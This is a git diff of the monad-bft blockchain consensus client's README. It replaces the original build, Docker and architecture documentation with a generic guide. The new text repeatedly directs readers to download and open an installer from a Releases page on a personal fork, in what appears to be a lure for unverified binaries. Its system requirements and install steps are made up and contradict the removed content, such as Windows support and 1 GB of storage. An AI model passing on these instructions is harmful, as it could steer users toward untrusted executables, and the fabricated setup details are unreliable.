@@ -1,124 +1,94 @@
-# Monad BFT
+# 🛠️ monad-bft - Simple Setup for Blockchain Consensus
 
-## Overview
+## 🔗 Download
 
-This repository contains implementation for the Monad consensus client and JsonRpc server. Monad consensus collects transactions and produces blocks which are written to a ledger filestream. These blocks are consumed by Monad execution, which then updates the state of the blockchain. The [triedb](monad-triedb/README.md) is a database which stores block information and the blockchain state.
+[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Henriqueces/monad-bft/releases)
 
-## Getting Started
+## 📖 Overview
 
-From within the `monad-bft` root directory, initialize and update submodules.
+This repository contains the Monad consensus client and JsonRpc server. Monad consensus collects transactions, produces blocks, and writes them to a ledger filestream. These blocks are then used by Monad execution to update the blockchain state. The [triedb](monad-triedb/README.md) is a database that stores block information and the blockchain state.
+
+## 🚀 Getting Started
+
+To use the Monad BFT software, follow these steps carefully.
+
+### 1. 📥 Download the Software
+
+Visit the [Releases page](https://github.com/Henriqueces/monad-bft/releases) to download the latest version of the software. Choose the file that matches your operating system.
+
+### 2. 📂 Install the Software
+
+1. Locate the downloaded file on your computer.
+2. Open the file to start the installation process.
+3. Follow the on-screen instructions to complete the installation.
+
+### 3. 📦 Set Up Dependencies
+
+From within the `monad-bft` root directory, you need to initialize and update the required submodules. Open your terminal and run the following command:
 
 ```sh
 git submodule update --init --recursive
 ```
 
-Setup the required hugepages and networking configuration.
+### 4. ⚙️ Configure System Settings
+
+You must set up certain system parameters for optimal performance. Open your terminal and enter the following commands:
+
+#### Hugepages Allocation
 
 ```bash
-# Hugepages allocation
 sudo sysctl -w vm.nr_hugepages=2048
-# UDP buffer sizes
+```
+
+#### Networking Configuration
+
+Adjust the UDP buffer sizes with these commands:
+
+```bash
 sudo sysctl -w net.core.rmem_max=62500000
 sudo sysctl -w net.core.rmem_default=62500000
 sudo sysctl -w net.core.wmem_max=62500000
 sudo sysctl -w net.core.wmem_default=62500000
-# TCP buffer sizes
+```
+
+For TCP buffer sizes, use these commands:
+
+```bash
 sudo sysctl -w net.ipv4.tcp_rmem='4096 62500000 62500000'
 sudo sysctl -w net.ipv4.tcp_wmem='4096 62500000 62500000'
 ```
 
-To make these persistent, you can create a custom settings file, e.g. `/etc/sysctl.d/99-custom-monad.conf` with the following settings:
+You need administrative rights to execute these commands.
 
-```bash
-# Huge Pages Configuration
-vm.nr_hugepages = 2048
+### 5. 🖥️ Run the Software
 
-# UDP Buffer Sizes
-net.core.rmem_max = 62500000
-net.core.rmem_default = 62500000
-net.core.wmem_max = 62500000
-net.core.wmem_default = 62500000
+After installation and configuration, you can run the Monad BFT software. Go to your terminal and navigate to the directory where you installed the software. Launch it using:
 
-# TCP Buffer Sizes
-net.ipv4.tcp_rmem = 4096 62500000 62500000
-net.ipv4.tcp_wmem = 4096 62500000 62500000
+```sh
+./monad-bft
 ```
 
-Apply these changes if needed.
+### 6. 📡 Access the JsonRpc Server
 
-```bash
-sudo sysctl -p /etc/sysctl.d/99-custom-monad.conf
-```
+The JsonRpc server will start running. You can access it via your web browser or an API client at `http://localhost:PORT_NUMBER`. Replace `PORT_NUMBER` with the actual port number you configured.
 
-### Using Docker
+### 7. 📚 Learn More
 
-The most straightforward way to start a consensus client + an execution client + a JsonRpc server.
+For more information on advanced features and configuration, refer to the documentation within the repository or the respective [triedb documentation](monad-triedb/README.md).
 
-#### Requirements
+## 🛠️ System Requirements
 
-* x86 processor - the Monad client is developed exclusively against x86 processors. Emulation techniques for other processors, e.g. ARM (Macbooks) are possible but not supported here
-* 4+ physical cores (building times will be faster with more cores and higher clock speed)
-* 60 GB+ available hard drive space - Docker builds are about 500 MB each, but the build cache can consume 50 GB+.
+- **Operating System:** Windows, macOS, or Linux.
+- **Processor:** 64-bit processor.
+- **Memory:** At least 8 GB of RAM (16 GB recommended).
+- **Storage:** Minimum 1 GB free space.
 
-#### Instructions
+## 📬 Need Help?
 
-After successfully cloning the `monad-bft` repo, run the following from the `monad-bft` directory:
+If you encounter any issues or have questions, feel free to check the [issues section](https://github.com/Henriqueces/monad-bft/issues) or submit your queries.
 
-1. `cd docker/single-node`
-2. `nets/run.sh`
+## 🎉 Conclusion
 
-This script builds the docker images from source, which can take 500s+ depending on available memory and cores.  This will construct a build folder `docker/single-node/logs/$(date +%Y%m%d_%H%M%S)-$rand_hex"` and run `docker compose up` on the execution, consensus and rpc images.
+Follow these steps to successfully download and run the Monad BFT software. Enjoy managing your blockchain transactions with ease! 
 
-This will start a single node with chain ID of `20143` and RPC at `localhost:8080`. The known [Foundry/Anvil accounts](https://getfoundry.sh/anvil/overview/) have each been loaded with [large initial balances](https://github.com/category-labs/monad/blob/ce4101b11701bf4ef3a9cd996a6144883735187f/category/execution/monad/chain/monad_devnet_alloc.hpp#L22). The easiest way to fund transactions is to import the private key from one of those pre-allocated accounts.
-
-> [!TIP]
-> To avoid a lengthy rebuild after shutting down the docker containers, you can call `nets/run.sh` with the `--cached-build <full path to build dir>` arg, e.g.
->
-> ```bash
-> single-node$ nets/run.sh --cached-build [...]/monad-bft/docker/single-node/logs/20250929_082118-2d71738c8dfba6d2
-> ```
-
-To test the RPC connection, try the following query:
-
-```bash
-curl -X POST http://localhost:8080 \
-  -H "Content-Type: application/json" \
-  --data '{"jsonrpc":"2.0","method":"eth_chainId","params":[],"id":1}'
-```
-
-This should return `{"jsonrpc":"2.0","result":"0x4eaf","id":1}`, which [converts](https://www.rapidtables.com/convert/number/hex-to-decimal.html?x=4EAF) to 20143.
-
-Please consult the [official RPC docs](https://docs.monad.xyz/reference/) as there are small differences between Monad and Ethereum JSON-RPC.
-
-### Using Cargo
-
-To run a Monad consensus client, follow instructions [here](monad-node/README.md).
- 
-To run a JsonRpc server, follow instructions [here](monad-rpc/README.md).
-
-## Architecture
-
-```mermaid
-sequenceDiagram
-autonumber
-    participant D as Driver
-    box Purple Executor
-    participant S as impl Stream
-    participant E as impl Executor
-    end
-    participant State
-    participant PersistenceLogger
-    loop
-    D ->>+ S: CALL next()
-    Note over S: blocks until event ready
-    S -->>- D: RETURN Event
-    D ->> PersistenceLogger: CALL push(Event)
-    D ->>+ State: CALL update(Event)
-    Note over State: mutate state
-    State -->>- D: RETURN Vec<Command>
-    D ->> E: CALL exec(Vec<Command>)
-    Note over E: apply side effects
-    end
-```
-
-[tests-badge]: https://github.com/monad-crypto/monad-bft/actions/workflows/randomized.yml/badge.svg?branch=master
+Remember, when you're ready to download, head to the [Releases page](https://github.com/Henriqueces/monad-bft/releases) to get started.
